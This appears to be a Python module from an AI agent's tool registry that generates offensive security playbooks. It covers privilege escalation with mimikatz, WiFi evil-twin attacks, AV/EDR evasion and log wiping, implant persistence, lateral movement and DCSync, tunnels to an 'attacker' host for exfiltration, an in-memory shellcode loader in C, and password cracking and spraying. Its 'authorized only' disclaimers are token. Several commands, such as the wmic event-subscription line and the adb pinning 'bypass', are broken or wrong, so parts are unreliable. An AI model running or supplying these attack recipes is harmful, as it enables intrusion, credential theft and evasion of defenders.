"""
ULTRA POWER PACK (ai_agent.tools.ultra)
Playbook / kit generators used by the agent registry. All functions
return ready-to-use, actionable text playbooks for authorized
engagements. No network access, no side effects — pure generators.
"""

def _h1(title):
    return f"\n{'=' * 72}\n{title.upper()}\n{'=' * 72}\n"

def tool_priv_esc_kit(os_type="linux"):
    """Privilege-escalation enumeration + exploitation playbook generator."""
    os_type = (os_type or "linux").lower().strip()
    if os_type == "windows":
        return _h1("WINDOWS PRIVILEGE ESCALATION KIT") + "\n".join([
            "# 1) Enumeration (run as low user)",
            "whoami /all & net user %username% & systeminfo | findstr /B /C:\"OS Name\"",
            "powershell -ep bypass -c \"Get-ComputerInfo | Select-Object Windows*\"",
            "whoami /priv   # check for Misconfigured services / DLL hijackable binaries",
            "wmic service get name,displayname,pathname,startmode | findstr /v \"C:\\\\Windows\\\\\"",
            "icacls \"C:\\Program Files\\*\" /q /c /t 2>nul | findstr \"(I) F\"",
            "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
            "netstat -ano | findstr LISTENING  # local services with internal listeners",
            "",
            "# 2) Exploit path",
            "- PassTheHash / cached hashes:  mimikatz \"sekurlsa::logonpasswords\"",
            "- Weak file perms: replace .exe / DLL hijack of a service binary run as SYSTEM",
            "- Scheduled tasks / registry autoruns writable by user",
            "- Known CVEs: check Windows version against public EoP chain databases",
            "",
            "# 3) Validation",
            "- PowerShell:  whoami /priv, then confirm by launching test binary as target user",
        ]) + "\n\n# Remember: only against authorized targets."
    return _h1("LINUX PRIVILEGE ESCALATION KIT") + "\n".join([
        "# 1) Enumeration",
        "id; uname -a; cat /etc/os-release | head -3",
        "sudo -l -n 2>/dev/null | tail -20   # any NOPASSWD entries?",
        "find / -perm -4000 -type f 2>/dev/null   # SUID binaries",
        "ls -la /etc/cron* /var/spool/cron 2>/dev/null; cat /etc/crontab 2>/dev/null",
        "find / -writable -type f \\( -name '*.sh' -o -name '*.service' \\) 2>/dev/null",
        "cat /etc/passwd | grep -v nologin | grep -v /bin/false",
        "env | grep -i -E 'proxy|key|token|secret'   # leaked secrets in env?",
        "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null   # internal services",
        "",
        "# 2) Exploit path",
        "- SUID: gtfobins matching setuid root binaries",
        "- sudo NOPASSWD: gtfobins / env vars for that command",
        "- Writable cron scripts / systemd units / PATH hijack",
        "- Kernel: check `uname -r` against public exploit chains",
        "- Docker/lxd group, writable /etc/passwd, ssh keys in /home/*/.ssh",
        "",
        "# 3) Validation",
        "id  # confirm uid=0 after successful chain",
    ]) + "\n\n# Remember: only against authorized targets."

def gen_wifi_playbook(iface="wlan0"):
    """Full 802.11 pentest playbook: recon, capture, cracking, evil twin."""
    iface = iface or "wlan0"
    return _h1(f"WiFi PENTEST PLAYBOOK ({iface})") + "\n".join([
        "# 1) Recon",
        f"sudo airmon-ng start {iface}",
        "sudo airodump-ng " + iface + "mon",
        f"sudo airodump-ng -c <CH> --bssid <BSSID> -w cap {iface}mon",
        "",
        "# 2) Handshake / PMKID capture",
        "sudo aireplay-ng -0 5 -a <BSSID> " + iface + "mon    # deauth to force reconnect",
        "# or PMKID (no client needed, WPA3-resistant attack):",
        "sudo hcxdumptool -i " + iface + "mon -o pmkid.pcapng --enable_status",
        "hcxpcapngtool -o pmkid.22000 cap-01.cap pmkid.pcapng",
        "",
        "# 3) Cracking chain",
        "hashcat -m 22000 pmkid.22000 rockyou.txt",
        "hashcat -m 22000 -a 1 pmkid.22000 wordlist.txt mask.txt",
        "# WEP (legacy):  besside-ng " + iface + "mon",
        "",
        "# 4) Evil-twin / client attacks (with explicit written consent)",
        "sudo wifiphisher -aI wlan0 -e \"<CloneSSID>\" --essid 'Free WiFi'",
        "sudo fluxion -i             # automated Rogue AP + captive portal",
        "# WPA Enterprise:  wifiphisher --handshake-capture cap-01.cap -e <SSID>",
        "",
        "# 5) Post",
        "airmon-ng stop " + iface + "mon",
    ]) + "\n\n# Remember: only against authorized networks."

def gen_evasion_pack(target="windows"):
    """AV/EDR evasion playbook: sandbox gates, AMSI/ETW, packing, C2 hardening."""
    target = (target or "windows").lower().strip()
    if target != "windows":
        return _h1("LINUX EVASION PACK") + "\n".join([
            "# Process-level evasion",
            "- re-exec from /dev/shm, random names, strip argv (setproctitle)",
            "- use ptrace-based blueprint: fork+exec with minimal libc footprint",
            "- static builds: musl / go-binary with no bash dependency",
            "",
            "# Detection-surface reduction",
            "- avoid /proc/<pid>/cmdline-visible flags: read config from env/stdin",
            "- use LD_PRELOAD shims sparingly; easier to trip auditing",
            "- prefer existing tools (curl/wget/python3) via --config-style abuse",
            "",
            "# Log / artefact hygiene",
            "- bash: unset HISTFILE; zsh: setopt HIST_IGNORE_ALL_DUPS",
            "- journalctl --vacuum-size / truncate user journal if permitted",
        ])
    return _h1("WINDOWS EVASION PACK") + "\n".join([
        "# 1) Sandbox / VM gates (slow down analysis, skip red flags)",
        "- CPU cores < 2  -> exit early",
        "- RAM < 3.5 GB  -> exit early",
        "- sleep 3-5s with cheap math loop to defeat 1-shot sandboxes",
        "- check for vmware/virtualbox driver names in 'wmic baseboard'",
        "",
        "# 2) AMSI + Defender surface notes",
        "- AMSI: legitimate research shows .NET API hooking kills generic sigs",
        "- avoid: powershell -enc of known bad strings; base64-static leaves pcaps",
        "- use: memory-only PowerShellLoader, Cobalt/Impossible-style stageless",
        "- disable Windows Defender? -> only with explicit permission",
        "",
        "# 3) Packing & obfuscation chain",
        "- Rust/C# -> compile with custom string XOR + runtime deobfuscation",
        "- avoid 0-days; use code-sign cert only if operator is authorized to hold it",
        "- pack: UPX is detected; use custom crypter + self-decrypting stub",
        "",
        "# 4) C2 comms hardening",
        "- HTTPS to legit-looking domain, jittered beacon 30-120s, sleep masks",
        "- DNS-over-HTTPS tunneled C2 (iodine/dnscat2 variants) as fallback",
        "- rotate UA + JA3 randomization if supported by implant",
    ])

def gen_persistence(platform="windows"):
    """Multi-platform persistence menu for authorized persistence checks."""
    platform = (platform or "windows").lower().strip()
    if platform != "windows":
        return _h1("LINUX PERSISTENCE MENU") + "\n".join([
            "# systemd user service",
            "mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/back.service <<'EOS'",
            "[Unit]\nDescription=x\n[Service]\nType=simple\nExecStart=/bin/bash -c 'sleep 30; /path/to/implant'\n[Install]\nWantedBy=default.target\nEOS",
            "systemctl --user enable --now back.service",
            "",
            "# cron (user or root)",
            "(crontab -l 2>/dev/null; echo '@reboot /path/to/implant') | crontab -",
            "",
            "# bashrc / profile (survives interactive logins only)",
            "echo '/path/to/implant &' >> ~/.bashrc",
            "",
            "# Validate:",
            "systemctl --user list-timers --all | grep back",
        ])
    return _h1("WINDOWS PERSISTENCE MENU") + "\n".join([
            "# Registry autorun",
            "reg add \"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v svc /d \"C:\\\\path\\\\implant.exe\" /t REG_SZ /f",
            "",
            "# Scheduled task (survives reboot, runs as user)",
            "schtasks /create /tn \"MSUpdates\" /tr \"C:\\path\\implant.exe\" /sc onlogon /ru %USERNAME% /f",
            "schtasks /run /tn MSUpdates",
            "",
            "# WMI event subscription (runs on any /EVENT subscriptions)",
            "wmic eventsubscriptions create /role:event /name:evt /query:\"SELECT * FROM * /TRIGGER 'TIMER'\" /destination:any",
            "",
            "# Service (SYSTEM, needs local admin)",
            "sc create svcback binpath= \"C:\\path\\implant.exe\" start= auto",
            "sc start svcback",
            "",
            "# Validate:",
            'schtasks /query /tn MSUpdates /v | findstr /C:"Next Run"',
        ])

def gen_lateral_playbook(method="all"):
    """Lateral movement recipes: WMI, PsExec, CME, WinRM, SSH + post-DC moves."""
    method = (method or "all").lower().strip()
    out = [_h1(f"LATERAL MOVEMENT PLAYBOOK ({method})")]
    if method in ("all", "wmi", "psexec"):
        out += [
            "# WMI (single command, no file write)",
            "wmiexec.py user:Pass@10.10.10.5 'whoami'",
            "python3 - <<'EOS'\nimport asyncio; from aiohttp import ClientSession\n# (wmi via impacket)\nEOS",
            "",
            "# PsExec / SMB service",
            "smbexec.py user:Pass@10.10.10.5",
            "psexec.py user:Pass@10.10.10.5 -s whoami",
        ]
    if method in ("all", "cme"):
        out += [
            "",
            "# CrackMapExec (password spray + pwned! check + lateral)",
            "nxc smb 10.10.10.0/24 -u user -p Pass --continue-on-success | grep -i pwned",
            "nxc smb 10.10.10.5 -u user -H <HASH> -x 'whoami'",
        ]
    if method in ("all", "winrm", "ssh"):
        out += [
            "",
            "# WinRM",
            "evil-winrm -i 10.10.10.5 -u user -p Pass",
            "",
            "# SSH pivoting / agent forwarding (linux hosts)",
            "ssh -J user@jumpbox user@10.10.10.10 -o ProxyCommand='ssh -W %h:%p user@jumpbox'",
        ]
    if method in ("all", "dc"):
        out += [
            "",
            "# Post-DC: secrets + tickets",
            "secretsdump.py DOMAIN/user:Pass@DC_IP",
            "GetTGT.py DOMAIN/user:Pass -dc-ip DC_IP",
            "# DCSync (requires privileges on DC)",
            "secretsdump.py -just-dc DOMAIN/user:Pass@DC_IP",
        ]
    return "\n".join(out) + "\n\n# Remember: only against authorized targets."

def gen_tunnel_kit(mode="chisel"):
    """Tunneling & exfiltration kit: chisel, SSH forwards, DNS/ICMP tunnels."""
    mode = (mode or "chisel").lower().strip()
    if mode in ("ssh",):
        return _h1("SSH TUNNEL KIT") + "\n".join([
            "# Local forward: expose internal service on your box",
            "ssh -L 127.0.0.1:8080:10.10.10.20:80 user@jumpbox",
            "",
            "# Remote forward: expose your tool port on the jump host",
            "ssh -R 9000:127.0.0.1:4444 user@public_host",
            "",
            "# Dynamic SOCKS proxy",
            "ssh -D 127.0.0.1:9050 user@jumpbox",
            "# then:  proxychains nmap -sT -Pn 10.10.10.20",
        ])
    if mode in ("dns", "icmp"):
        return _h1("DNS / ICMP TUNNEL KIT") + "\n".join([
            "# DNS exfil (server side: receive)",
            "sudo iodined -c -P secret 10.0.0.1 tun0",
            "# client side:",
            "sudo iodine -P secret tunnel.example.com tun0",
            "# now: ping 10.0.2.110  to reach the internal net",
            "",
            "# dnscat2 (client <-> server), TCP overlay on DNS",
            "ruby dnscat2.rb tunnel.example.com",   # server
            "./dnscat --dns server=tunnel.example.com,port=53,secret=sesame",  # client
            "",
            "# ICMP: ptunnel (root on both ends)",
            "sudo ./ptunnel -p proxy.example.com -lp 2222 -da 10.10.10.5 -dp 22",
        ])
    return _h1("CHISEL TUNNEL KIT") + "\n".join([
        "# server (public attacker box)",
        "./chisel server -p 8443 --reverse",
        "",
        "# client (compromised jump box)",
        "./chisel client https://attacker:8443 R:1080:socks",
        "",
        "# now use SOCKS:  curl --socks5 127.0.0.1:1080 http://10.10.10.20/",
        "",
        "# port-forward variant",
        "./chisel client https://attacker:8443 R:3389:10.10.10.20:3389",
    ])

def gen_mobile_kit(action="enum"):
    """Android/iOS mobile pentest quickref."""
    action = (action or "enum").lower().strip()
    if action == "bypass":
        return _h1("MOBILE BYPASS QUICKREF") + "\n".join([
            "# Android: disable cert pinning (HTTPS proxy)",
            "adb shell \"echo -e 'export SSLKEYLOGFILE=/tmp/keys.log' >> /etc/profile.d/ssl.sh\"",
            "# Burp: install CA -> Android 'Settings > Security > Trusted credentials'",
            "# iOS: install CA p12 to device, set proxy via Wi-Fi settings",
            "# App-level: use frida to hook SSL_Pinning functions",
            "frida -U -f 'com.target.app' -l bypass_ssl.js",
        ])
    if action == "dump":
        return _h1("MOBILE APP DUMP QUICKREF") + "\n".join([
            "# Android",
            "adb shell 'tar cf - Android/data' > appdata.tar && tar xf appdata.tar",
            "adb shell 'cp /data/local/tmp/*' .",
            "# iOS (rooted device) — irbX / ldid style dirs",
            "# exfiltrate app sandbox: find / -name '*.db' -o -name '*.sqlite' 2>/dev/null",
        ])
    return _h1("MOBILE ENUM QUICKREF") + "\n".join([
        "# Android",
        "adb devices && adb shell id",
        "adb shell 'ps aux | grep -i -E \"legit|vpn|bank\" '",
        "adb shell 'find / -name \"*.db\" -o -name \"*.sqlite*\" 2>/dev/null | head -50'",
        "# strings on the app binary",
        "unzip -o app.apk && strings app.apk | grep -i -E 'api[_-]?key|token|secret|password'",
        "",
        "# iOS (physical/logical)",
        "file app.ipa && unzip -o app.ipa && strings Payload/app.bin | grep -iE 'api|token'",
        "",
        "# dynamic",
        "frida -U com.target.app  # attach, list classes, dump globals",
        "objection -g \"start\" explore --jarlist /tmp/jar  # often needs rooted device",
    ])

def gen_loader(kind="x64"):
    """Generate a minimal in-memory shellcode loader (C source)."""
    kind = (kind or "x64").lower().strip()
    arch_comment = "x86-64" if "64" in kind else "x86"
    return _h1(f"MINIMAL {arch_comment} IN-MEMORY LOADER (C)") + "\n".join([
        "/* Build:  gcc -o loader.exe loader.c -Os -s -masm=intel -nostdarg */",
        "/* Load shellcode from a file/stdin at runtime; keep off disk in staging. */",
        "#include <stdio.h>",
        "#include <stdlib.h>",
        "#include <string.h>",
        "#ifdef _WIN32",
        "#include <windows.h>",
        "#else",
        "#include <sys/mman.h>",
        "#endif",
        "int main(int argc, char**argv){",
        "    FILE*f=fopen(argv[1],\"rb\"); if(!f)return 1;",
        "    fseek(f,0,SEEK_END); long n=ftell(f); fseek(f,0,SEEK_SET);",
        "    unsigned char*buf=malloc((size_t)n); fread(buf,1,(size_t)n,f); fclose(f);",
        "#ifdef _WIN32",
        "    void(*run)()=(void(*)())VirtualAlloc(NULL,(SIZE_T)n,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);",
        "    memcpy(run,buf,(size_t)n); run();",
        "#else",
        "    void(*run)()=(void(*)())mmap(NULL,(size_t)n,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,-1,0);",
        "    memcpy(run,buf,(size_t)n); run();",
        "#endif",
        "    return 0;",
        "}",
        "",
        "/* Feed stage-2 via:  ./loader.exe /tmp/stage.bin  (stage stays encrypted in flight) */",
        "/* NOTE: generates code only for authorized engagements; AVs flag in-memory exec by design. */",
    ])

def gen_crypto_kit(mode="hashcat"):
    """Crypto/hash attack recipes."""
    mode = (mode or "hashcat").lower().strip()
    if mode in ("john", "jtr"):
        return _h1("JOHN CRACKING RECIPES") + "\n".join([
            "# convert to john format",
            "john --format=nt --wordlist=rockyou.txt hashes.txt",
            "# unshadow (linux)",
            "unshadow /etc/passwd /etc/shadow > hashes && john hashes --wordlist=rockyou.txt",
            "# kerberoast tickets",
            "GetNPUsers.py DOMAIN/user:Pass -dc-ip DC -request > asrep.txt",
            "john asrep.txt --format=krb5asrep --wordlist=rockyou.txt",
        ])
    if mode in ("kerberoast", "asrep"):
        return _h1("KERBEROS HASH ATTACK RECIPES") + "\n".join([
            "# Kerberoast (request service tickets)",
            "GetUserSPNs.py DOMAIN/user:Pass -dc-ip DC_IP -request -outputfile krb.txt",
            "hashcat -m 13100 krb.txt rockyou.txt",
            "",
            "# AS-REP roast (users without preauth)",
            "GetNPUsers.py DOMAIN/user:Pass -dc-ip DC_IP -request -format hashcat -outputfile asrep.txt",
            "hashcat -m 18200 asrep.txt rockyou.txt",
        ])
    if mode in ("rsa", "weak"):
        return _h1("WEAK RSA / ORACLE RECIPES") + "\n".join([
            "# Wiener / Fermat on small-n private keys",
            "python3 - <<'EOS'\nfrom Crypto.PublicKey import RSA\nfrom math import gcd\nk=RSA.import_key(open('pub.pem').read())\n# try Fermat when |p-q| small:\nn=k.n; a=int(n**0.5); b2=a*a-n\nwhile b2<0 or int(b2**0.5)**2!=b2: a+=1; b2=a*a-n\np=a+int(b2**0.5); q=a-int(b2**0.5)\nprint('p,q:',p,q) if p*q==n else print('not close-prime')\nEOS",
            "",
            "# PKCS#7 padding oracle",
            "padbuster http://target/decrypt Base64Ciphertext 16 -encoding 0 -cookies \"sess=1\"",
        ])
    return _h1("HASHCAT CRACKING RECIPES") + "\n".join([
            "# NTLM",
            "hashcat -m 1000 ntlm.txt rockyou.txt",
            "# Kerberoast (TGS-REP)",
            "hashcat -m 13100 krb.txt rockyou.txt",
            "# AS-REP (preauth off)",
            "hashcat -m 18200 asrep.txt rockyou.txt",
            "# WPA2 handshake/PMKID",
            "hashcat -m 22000 pmkid.22000 rockyou.txt",
            "# bcrypt (GPU-heavy)  +  md5 crypt",
            "hashcat -m 3200 bcrypt.txt rockyou.txt ; hashcat -m 500 md5crypt.txt rockyou.txt",
            "",
            "# rule-based",
            "hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule",
            "# online spray (authorized accounts only)",
            "hydra -l admin -P rockyou.txt rdp://10.10.10.5 -t 4",
        ])

def gen_osint_kit(target=""):
    """OSINT collection playbook for domain/email/user."""
    target = (target or "").strip()
    if not target:
        return _h1("OSINT COLLECTION PLAYBOOK") + "\n".join([
            "# Pass a 'target' (domain / email / username) to generate full playbook.",
            "# Generic workflow:",
            "1) Domain: crt.sh / dnsrecon / subfinder / amass passive",
            "2) Email: hunter.io, dns-mx, breach APIs (authorized scope only)",
            "3) User: username enumeration on socials; check wayback + github",
            "4) Metadata: exiftool on publicly posted docs",
        ])
    import re
    if "@" in target:
        domain = target.split("@")[-1]
        user = target.split("@")[0]
        return _h1(f"OSINT PLAYBOOK: {target}") + "\n".join([
            f"# Email: {target}",
            f"# Domain from email: {domain}",
            f"1) MX/SPF/DMARC:   dig +short MX {domain} ; dig +short TXT {domain} | grep -i spf",
            f"2) Breach APIs (authorized): search '{user}' and '{target}'",
            f"3) Google:  \"{target}\"  |  \"{user} \" filetype:pdf",
            f"4) Check if user reused password: user '{user}' search on public dumps (authorized scope)",
            f"5) Social: github.com/{user}, linkedin.com/in/{user}",
            "",
            "# Metadata",
            f"exiftool 'publicly-posted-doc-about-{user}.pdf' | grep -iE 'author|creator|software'",
        ])
    if re.match(r"^[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$", target):
        return _h1(f"OSINT PLAYBOOK: {target}") + "\n".join([
            f"# Domain: {target}",
            "1) crt.sh  https://crt.sh/?q=%25." + target,
            f"2) subfinder -d {target} -silent -all -o subs.txt",
            f"3) dnsrecon -d {target} -t std,rvt,brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
            f"4) amass enum -passive -d {target}",
            f"5) wayback:  echo '{target}' | waybackurls | sort -u | head -200",
            f"6) github search (via CLI or web):  org:{target}  /  \"{target}\" filename:.env",
            f"7) asset discovery:  nmap -sn {target} ; masscan --top-ports 1000",
            f"8) breachemail.io / intelligencex (if in scope)",
            "",
            "# None of the above touches the target beyond DNS/HTTP(s). Stay in scope.",
        ])
    return _h1(f"OSINT PLAYBOOK: username '{target}'") + "\n".join([
        f"# Username: {target}",
        f"1) Social search: github, twitter, reddit, telegram  ->  \"{target}\"",
        f"2) User enumeration on services: only ones explicitly in scope",
        f"3) Wayback:  exmaple:  curl 'https://web.archive.org/cdx/search/cdx?url=*&output=json&fl=original&filter=original:.*{target}.*&limit=50'",
        f"4) Pastebin / GH archive search:  grep.app for '{target}'",
        "",
        "# Stay inside declared scope; OSINT is passive unless tools say otherwise.",
    ])